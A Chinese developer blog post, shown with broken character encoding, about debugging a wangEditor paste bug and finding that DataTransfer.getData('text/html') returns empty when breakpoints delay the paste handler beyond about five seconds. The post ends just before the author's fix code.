content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è®°ä¸€æ¬¡å‘ç° DataTransfer çš„ getData çš„æœ‰è¶£é—®é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2066737588871287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HabaraAi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T13:23:41.000Z" title="Mon Dec 29 2025 13:23:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰æƒ…æè¦</h2>
<p>ä¹‹å‰åŸºäºåŒè¶Šè€å¸ˆçš„ wangEditor å¼€å‘äº†ä¸€ä¸ªè½¯ä»¶ï¼Œä»Šæ—©å®¢æˆ·ååº”åœ¨å•å…ƒæ ¼é‡Œé¢ç²˜è´´ç½‘é¡µä¸Šå¤åˆ¶çš„å†…å®¹ä¼šå°†å†…å®¹æ’å…¥åˆ°è¡¨æ ¼ä¸‹é¢ï¼Œç„¶åæƒ³è¯•ç€å¤ç°ä¸€ä¸‹ï¼Œç»“æœä¸­é€”ç¬¬ä¸€æ¬¡é‡åˆ°äº† DataTransfer çš„ getData é—®é¢˜ã€‚</p>
<h2 data-id="heading-1">é—®é¢˜æè¿°</h2>
<p>DataTransfer çš„ getData æ–¹æ³•åœ¨æœ‰å’Œæ²¡æœ‰æ–­ç‚¹çš„æƒ…å†µä¸‹ï¼Œè·å– text/html ç±»å‹çš„å€¼ä¸ä¸€æ ·çš„é—®é¢˜ï¼Œä»è€Œå¯¼è‡´åç»­å¤„ç†é€»è¾‘ä¸ä¸€è‡´çš„é—®é¢˜ã€‚</p>
<h2 data-id="heading-2">BUG å‘ç°è¿‡ç¨‹</h2>
<p>æˆ‘å‡†å¤‡äº†ä¸€ä¸ªåŒ…å«è¡¨æ ¼åŠå•å…ƒæ ¼é‡Œé¢æœ‰å¯Œæ–‡æœ¬æ¨¡å—çš„æ¨¡ç‰ˆå’Œä¸€æ®µæµ‹è¯•ç”¨çš„å¯Œæ–‡æœ¬ï¼Œæ¨¡ç‰ˆåŠæµ‹è¯•ç²˜è´´å†…å®¹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p>ç¨‹åºæ¨¡ç‰ˆï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df95ab2fd89c4a65849c41d5786b2668~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=cyC0euE5YpjzbAMHWFULeougw0Q%3D" alt="image.png" loading="lazy"/></p>
<p>å†…å®¹ä¸ºä¸€ä¸ªç½‘ä¸Šéšä¾¿æ‰¾çš„åŒ…å«æ ‡é¢˜å’Œå†…å®¹çš„ç®€å•å¯Œæ–‡æœ¬ï¼š<br/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1961a3afe1924e3d9af6c98cf64f8a45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=PqI2s7Bv%2BV3hmhaeXiDkaLiixgI%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨å¯Œæ–‡æœ¬æ¨¡å—ä¸­ctrl+våï¼Œå¯Œæ–‡æœ¬å†…å®¹ç¡®å®è¢«æ’å…¥åˆ°äº†è¡¨æ ¼ä¸‹é¢ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5527b3dd014544d69352931447b72ee5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=jLzD6eaXwBrxt6CQRBIQYDFw7Zs%3D" alt="image.png" loading="lazy"/></p>
<p>æŒ‰ç…§ä¹‹å‰è¯»çš„æºç ç†è§£ï¼Œæ­¤æ—¶å…ˆæ‰§è¡Œçš„åº”è¯¥æ˜¯ wangEditor å†…éƒ¨çš„ paste é€»è¾‘ï¼Œæ–­ç‚¹æ£€æŸ¥åå‘ç°ç¡®å®æ‰§è¡Œäº†ä½†æ˜¯å¹¶æ²¡æœ‰åœ¨ paste é‡Œé¢å¤„ç†ï¼Œé‚£ä¹ˆå°±åªèƒ½æ˜¯åœ¨ insertData é‡Œé¢å¤„ç†çš„ã€‚ç»§ç»­æ‰“æ–­ç‚¹ç¡®å®šæœ€ç»ˆçš„æ’å…¥é€»è¾‘æ˜¯åœ¨ wangEditor å†…éƒ¨çš„ with-event-data.ts æ’ä»¶é‡Œé¢çš„ insertData çš„è¦†å†™ã€‚ä»¥ä¸‹æ˜¯æºä»£ç ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">  e.<span class="hljs-property">insertData</span> = <span class="hljs-function">(<span class="hljs-params">data: DataTransfer</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> fragment = data.<span class="hljs-title function_">getData</span>(<span class="hljs-string">'application/x-slate-fragment'</span>)
    <span class="hljs-keyword">if</span> (fragment) {
      <span class="hljs-keyword">const</span> decoded = <span class="hljs-built_in">decodeURIComponent</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">atob</span>(fragment))
      <span class="hljs-keyword">const</span> parsed = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(decoded) <span class="hljs-keyword">as</span> <span class="hljs-title class_">Node</span>[]
      e.<span class="hljs-title function_">insertFragment</span>(parsed)
      <span class="hljs-keyword">return</span>
    }

    <span class="hljs-keyword">const</span> text = data.<span class="hljs-title function_">getData</span>(<span class="hljs-string">'text/plain'</span>)
    <span class="hljs-keyword">const</span> html = data.<span class="hljs-title function_">getData</span>(<span class="hljs-string">'text/html'</span>)
    <span class="hljs-comment">// const rtf = data.getData('text/rtf')</span>

    <span class="hljs-keyword">if</span> (html) {
      e.<span class="hljs-title function_">dangerouslyInsertHtml</span>(html)
      <span class="hljs-keyword">return</span>
    }

    <span class="hljs-keyword">if</span> (text) {
      <span class="hljs-keyword">const</span> lines = text.<span class="hljs-title function_">split</span>(<span class="hljs-regexp">/\r\n|\r|\n/</span>)
      <span class="hljs-keyword">let</span> split = <span class="hljs-literal">false</span>

      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> line <span class="hljs-keyword">of</span> lines) {
        <span class="hljs-keyword">if</span> (split) {
          <span class="hljs-title class_">Transforms</span>.<span class="hljs-title function_">splitNodes</span>(e, { <span class="hljs-attr">always</span>: <span class="hljs-literal">true</span> })
        }

        <span class="hljs-title function_">insertText</span>(line)
        split = <span class="hljs-literal">true</span>
      }
      <span class="hljs-keyword">return</span>
    }
  }
</code></pre>
<p>åŸæœ¬æˆ‘æƒ³çš„éå¸¸ç®€å•ï¼Œåªéœ€è¦æ£€æŸ¥æˆ‘çš„è‡ªå®šä¹‰æ¨¡å—åœ¨æ‰§è¡Œæœ€åº•å±‚çš„ insertData å‰éƒ½åšäº†å“ªäº›å¤„ç†å°±å¯ä»¥åˆ¤æ–­é—®é¢˜äº§ç”Ÿçš„åŸå› åŠå¦‚ä½•ä¿®å¤äº†ï¼Œè€Œä¹Ÿå°±æ˜¯åœ¨è¿™ä¸€æ­¥å‘ç°äº† Datatransfer çš„é—®é¢˜ã€‚</p>
<p>æˆ‘åœ¨æ–­ç‚¹æ—¶æ ¹æ®è°ƒç”¨æ ˆæ‰¾åˆ°äº†è‡ªå®šä¹‰æ¨¡å—ä¹Ÿè¦†å†™äº†çš„ insertData æ–¹æ³•ï¼Œæ‰“ä¸Šæ–­ç‚¹ï¼Œç»§ç»­ç²˜è´´å†…å®¹ï¼ŒF10ä¸€æ­¥ä¸€æ­¥çš„è¿›è¡Œè°ƒç”¨ï¼Œéšåå‡ºç°çš„ç”»é¢è®©æˆ‘å¤§åƒä¸€æƒŠã€‚ã€‚ç²˜è´´çš„å†…å®¹å±…ç„¶å‡ºç°åœ¨äº†å¯Œæ–‡æœ¬æ¨¡å—é‡Œé¢ã€‚ä½†æ˜¯æ ‡é¢˜çš„æ ·å¼æ²¡äº†ï¼Œè¿™æ˜¯ä»€ä¹ˆæƒ…å†µï¼ŸğŸ¤”
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0417cd5829b244d8adbd57c38fa01455~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=5Zew1Rg6BfXQpVFN28TUns0J%2B%2Bs%3D" alt="image.png" loading="lazy"/></p>
<p>ä¸ºä»€ä¹ˆæ‰“äº†æ–­ç‚¹æ‰§è¡Œå’Œä¸æ‰“æ–­ç‚¹æœ€ç»ˆçš„æ•ˆæœä¼šä¸ä¸€æ ·ã€‚</p>
<p>äºæ˜¯æˆ‘å–æ¶ˆäº†å…¶ä½™æ–­ç‚¹ï¼Œç•™ä¸‹äº†ç¬¬14è¡Œçš„ if (html) è¿™é‡Œçš„æ–­ç‚¹ï¼Œç»§ç»­è°ƒè¯•ã€‚ç„¶åå¥‡æ€ªçš„ç°è±¡å‡ºç°äº†ï¼Œç²˜è´´çš„å†…å®¹åˆè·‘åˆ°äº†è¡¨æ ¼ä¸‹é¢ã€‚</p>
<p>æ­¤æ—¶å°±é”å®šé—®é¢˜äº†ï¼šwangEditor åœ¨å…¶ä½™é€»è¾‘æ²¡æœ‰ä¸­æ–­å¤„ç†æ—¶ï¼Œæœ€ç»ˆçš„ insertData é‡Œé¢ä¼šè·å– DataTransfer é‡Œé¢çš„ text å’Œ htmlï¼Œhtml æ˜¯é«˜ä¼˜å…ˆçº§ï¼Œå½“ html æœ‰å†…å®¹æ—¶ï¼Œå°±ä¼šæ‰§è¡Œå†…éƒ¨çš„ <code>dangerouslyInsertHtml</code> æ–¹æ³•ï¼Œå†…éƒ¨çš„å®ç°å°±æ˜¯ä¼šæŠŠå¯Œæ–‡æœ¬è½¬æ¢ä¸º slatejs çš„èŠ‚ç‚¹ï¼Œç„¶åæ’å…¥åˆ°è¡¨æ ¼ä¸‹é¢ã€‚è€Œå½“ html æ²¡æœ‰å†…å®¹æ—¶ï¼Œå°±ä¼šæ‰§è¡Œä¸‹é¢çš„ if (text) å—ï¼Œæœ€ç»ˆæ‰§è¡Œçš„æ˜¯ <code>insertText</code> æ–¹æ³•ï¼Œå†…éƒ¨å¤„ç†å°±æ˜¯éå¸¸ç®€å•çš„æ’å…¥æ–‡æœ¬ï¼Œæ‰€ä»¥ç²˜è´´å†…å®¹æ‰ä¼šå‡ºç°åœ¨å¯Œæ–‡æœ¬æ¨¡å—ä¸‹é¢ï¼Œå¹¶ä¸”æ ‡é¢˜çš„æ ·å¼æ²¡äº†ã€‚</p>
<h2 data-id="heading-3">å‘ç°ä¸»è¦é—®é¢˜</h2>
<p>ä¸ºä»€ä¹ˆåœ¨æ‰“äº†å¤šä¸ªæ–­ç‚¹åï¼ŒgetData("text/html") çš„å€¼ä¼šä¸ä¸€æ ·ï¼Ÿ</p>
<ul>
<li>
<p>å¤šä¸ªæ–­ç‚¹æˆªå›¾ï¼Œhtml æ‹¿åˆ°çš„æ˜¯ç©ºå­—ç¬¦ä¸²
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9670edd50b44c568107b9782984fcd0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=9MXmb3q9CHAR87ivHmDgw1ZjBew%3D" alt="image.png" loading="lazy"/></p>
</li>
<li>
<p>å•ä¸ªæ–­ç‚¹æˆªå›¾ï¼Œhtmlæ‹¿åˆ°äº†å¯Œæ–‡æœ¬å€¼
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/355e993dd2c54f2a87090ec71c1b8274~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=6CEJHGdNtuBanEo%2BN6LYEkeeiJQ%3D" alt="image.png" loading="lazy"/></p>
</li>
</ul>
<h2 data-id="heading-4">å°è¯•ç†è§£åŸç†</h2>
<p>é‡äº‹ä¸å†³æ‰¾ AIï¼Œäºæ˜¯é—®äº†ä¸‹ Geminiï¼Œå¾—åˆ°ä»¥ä¸‹å›ç­”
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/251c834539a140718595ab7414f84b47~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=F%2B%2FUY4MQ4z3hFSy1ILKTYqgE0wg%3D" alt="image.png" loading="lazy"/>
æ’å¥é¢˜å¤–è¯ï¼Œè¿™é‡Œä¸å¾—ä¸åæ§½ä¸€ä¸‹ï¼Œåˆšåˆšçœ‹å®Œã€Šç»å‘½æ¯’å¸ˆã€‹è¿é‡åˆ°ä¸ªé—®é¢˜éƒ½å’Œæµ·æ£®å ¡æœ‰å…³ï¼Œäºæ˜¯æ»¡è„‘å­çš„â€œsay my nameâ€ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bd9f6df6a8441149cf5501f2d73f840~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=LYJ6sQDbKCZumB2YqOdNYmyjv1Q%3D" alt="image.png" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/190faad0940b494bbf04bb2cd32a0260~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=kYei5wWBXtf8FgK%2B1FjgPRhKmac%3D" alt="image.png" loading="lazy"/></p>
<p>ç»†é—®ä¹‹ä¸‹ï¼Œå¾—åˆ°ä»¥ä¸‹ç»“æœ
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be3f8d5dcc944cb4b1bf4f5fd80ea61d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=ZVdtV8BoUcGLslcRghIFQ2%2F2Sac%3D" alt="image.png" loading="lazy"/>
ç®€è€Œè¨€ä¹‹å°±æ˜¯æµè§ˆå™¨åœ¨æ‰“æ–­ç‚¹æœŸé—´ï¼Œè¿™ä¸ªå®‰å…¨è®¡æ—¶å¹¶æœªæš‚åœï¼Œäºæ˜¯ç­‰æˆ‘å¤„ç†å®Œä¸Šé¢çš„æ–­ç‚¹ï¼Œèµ°åˆ° <code>getData("text/html")</code> æ—¶ï¼Œå®‰å…¨è®¡æ—¶è¶…æ—¶äº†ä¹Ÿå°±æ‹¿åˆ°äº†ç©ºçš„å†…å®¹ã€‚</p>
<p><strong>é‚£ä¸ºä»€ä¹ˆ <code>getData("text/plain")</code> è¿˜æ˜¯å¯ä»¥æ‹¿åˆ°å€¼ï¼Ÿ</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c2893557118482ca890a28d534e416e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=fA%2BgH1NBWQf84B%2BVmUDCzEoI%2Fgk%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆ text/plain æœ‰å€¼è€Œ text/html æ²¡æœ‰å€¼ã€‚</p>
<h2 data-id="heading-5">å¦‚ä½•è§£å†³</h2>
<p>é—®é¢˜æ‰¾åˆ°äº†ï¼Œé‚£å¦‚ä½•è§£å†³ã€‚å¦‚æœæˆ‘éè¦åœ¨æ–­ç‚¹åä¹Ÿèƒ½æ‹¿åˆ° html çš„æ•°æ®ï¼Œæœ‰æ²¡æœ‰åŠæ³•ï¼Œè¿™ä¸ªå®‰å…¨è®¡æ—¶çš„æœ€å¤§æ—¶é—´åˆæ˜¯å¤šå°‘ï¼Ÿ</p>
<p>æ ¹æ®æˆ‘çš„ç®€å•è¯•é”™ï¼Œè¿™ä¸ªå®‰å…¨è®¡æ—¶å¤§æ¦‚æ˜¯5ç§’å·¦å³ã€‚å½“æ‰‹é€Ÿå¿«ä¸€ç‚¹çš„æƒ…å†µä¸‹ï¼Œä»æ‰§è¡Œäº‹ä»¶åˆ° text/html è¿™ä¸€æ­¥åœ¨5ç§’å†…æ—¶ï¼Œå¤šä¸ªæ–­ç‚¹ä¹Ÿæ˜¯å¯ä»¥æ‹¿åˆ°æ•°æ®çš„ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a24ba3dc5ad84de09a9d7064beb7002d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=pJw50rjV8ji00xlg%2FzfnXldcqeg%3D" alt="image.png" loading="lazy"/></p>
<p>é‚£ä¹ˆé—®é¢˜åˆåŒå’å•æ¥äº†ï¼Œ<strong>æœ‰æ²¡æœ‰è¶…è¿‡5ç§’ä¹Ÿå¯ä»¥æ‹¿åˆ°æ•°æ®çš„æ–¹æ³•å‘¢ï¼Ÿ</strong>ï¼Œæœ‰çš„å…„å¼Ÿï¼Œæœ‰çš„ã€‚</p>
<p>å½“ä½ æ‰‹é€Ÿä¸å¤Ÿå¿«ï¼Œåˆæƒ³ä¸€æ­¥ä¸€æ­¥æ…¢æ…¢è°ƒçš„æ—¶å€™ï¼Œå°±å»ç½‘ç«™è®¾ç½®é‡Œé¢æŠŠå‰ªè´´æ–¯æƒé™ç”±è¯¢é—®æ”¹æˆå…è®¸ã€‚å°±å¯ä»¥ä¸€æ­¥ä¸€æ­¥F10æ…¢æ…¢è°ƒäº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c14d2bc05b74fe791ef80f72035dd9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=0uc%2F%2FrbEn5M%2BOG8f5Q%2FpIzrDTi4%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8bba8fb51034382aad2a7e9473930ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=ZF%2BXAAQErbNAXjXxCC867tiJNZg%3D" alt="image.png" loading="lazy"/></p>
<p>çœ‹çœ‹æ•ˆæœ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e35db44cb2d4c5c9548421421b5c277~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFiYXJhQWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619420&amp;x-signature=4w1fMaO%2BkcpyYgY0zFDAY8ZooWM%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨ç¬¬105è¡Œæ·»åŠ ä¸€ä¸ªæ—¥å¿—æ–­ç‚¹ <code>console.time("html")</code>ï¼Œç„¶ååœ¨106è¡ŒåŠ ä¸€ä¸ªæ–­ç‚¹ç”¨æ¥ç­‰ä¸‹å¡ä½ï¼Œç­‰è¿‡10ç§’å†ä¸‹ä¸€æ­¥ï¼Œç„¶ååœ¨114è¡Œæ·»åŠ æ—¥å¿—æ–­ç‚¹ <code>console.timeEnd("html")</code>ï¼Œå†åœ¨117è¡Œå¡ä½ï¼Œå°±å¯ä»¥çœ‹åˆ° html è¿˜å¯ä»¥æ‹¿åˆ°å€¼äº†ã€‚è€Œæ§åˆ¶å°ä¹Ÿæ˜¾ç¤ºäº†ä¸­é€”å¡äº†11ç§’ï¼Œè¿™å·²ç»è¶…è¿‡äº†5ç§’çš„å®‰å…¨è®¡æ—¶ï¼Œä½†ä¾ç„¶å¯ä»¥æ‹¿åˆ°å€¼ã€‚</p>
<h2 data-id="heading-6">å°ç»“</h2>
<p>å…³äºè¿™ä¸ªé—®é¢˜ï¼Œç”±äºæ¯”è¾ƒæ‡’ï¼Œæ²¡æœ‰å»ç ”ç©¶åœ¨ä¸åŒçš„æµè§ˆå™¨ä¸Šæ˜¯å¦éƒ½ä¼šæœ‰è¿™ä¸ªå®‰å…¨æœºåˆ¶ï¼Œæˆ–è€…ä¸åŒçš„æµè§ˆå™¨çš„å®‰å…¨é™æ—¶æ˜¯å¦æ˜¯ä¸€æ ·çš„ï¼Œæˆ–è€…è®¾ç½®äº†å‰ªè´´æ¿ä¸ºå…è®¸åçš„è¡ŒåŠ¨é€»è¾‘æ˜¯å¦ä¸€æ ·ã€‚é€šè¿‡æ‹–æ‹½äº§ç”Ÿçš„DataTransferæ˜¯å¦ä¹Ÿæœ‰è¿™ä¸ªé™åˆ¶ï¼Œè¿™ä¸ªé™åˆ¶æ˜¯åœ¨æµè§ˆå™¨å±‚é¢çš„ï¼Œè¿˜æ˜¯åœ¨ ECMAScript é‡Œé¢è§„å®šçš„ç­‰ç­‰ã€‚åˆæˆ–è€…å¦‚æœä¸æ˜¯å› ä¸ºæ–­ç‚¹ï¼Œè€Œæ˜¯å› ä¸ºä¸­é€”å¤„ç†é€»è¾‘å°±æ˜¯è¶…è¿‡äº†5ç§’ï¼Œé‚£æ˜¯å¦è¿˜èƒ½æ‹¿å¾—åˆ°ã€‚åç»­æœ‰æœºä¼šçš„è¯å†è¿›è¡Œè¡¥å……ã€‚</p>
<h2 data-id="heading-7">æ€»ç»“</h2>
<ol>
<li>åœ¨ devtools é‡Œé¢ï¼Œå¦‚æœå› ä¸ºæ–­ç‚¹å¯¼è‡´ä»äº¤äº’äº‹ä»¶åˆ° getData("text/html") çš„æ—¶é—´è¶…è¿‡5ç§’ï¼Œé‚£ä¹ˆå°±ä¼šæ‹¿åˆ°ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚</li>
<li>getData("text/plain") ä¸å—æ­¤é™åˆ¶ï¼Œè¶…è¿‡5ç§’ä¹Ÿå¯ä»¥æ‹¿åˆ°å€¼ã€‚</li>
<li>å¼€å‘æ—¶é€šè¿‡å°†ç½‘é¡µçš„å‰ªè´´æ¿æƒé™æ”¹æˆâ€œå…è®¸â€å°±å¯ä»¥çªç ´è¿™ä¸ªå®‰å…¨è®¡æ—¶é™åˆ¶ã€‚</li>
</ol>
<h2 data-id="heading-8">BUG æ”¹äº†å—ï¼Ÿï¼ˆä¸æœ¬è´´å†…å®¹æ— å…³ï¼‰</h2>
<p>æ”¹äº†ï¼Œæ”¹äº†ã€‚éå¸¸ç®€å•ï¼Œåªéœ€è¦åœ¨å¯Œæ–‡æœ¬æ¨¡å—é‡å†™ insertData æ–¹æ³•ï¼Œå¦‚æœäº‹ä»¶æ‰§è¡Œæ—¶åœ¨å¯Œæ–‡æœ¬æ¨¡å—ä¸­ï¼Œå°±è·å– htmlï¼Œç„¶åè½¬æ¢æˆ slate èŠ‚ç‚¹ï¼Œå†æŠŠå¯Œæ–‡æœ¬æ¨¡å—æ•´ä¸ªæ›¿æ¢æ‰å°±å¯ä»¥äº†ã€‚å®ç°ï¼š</p>
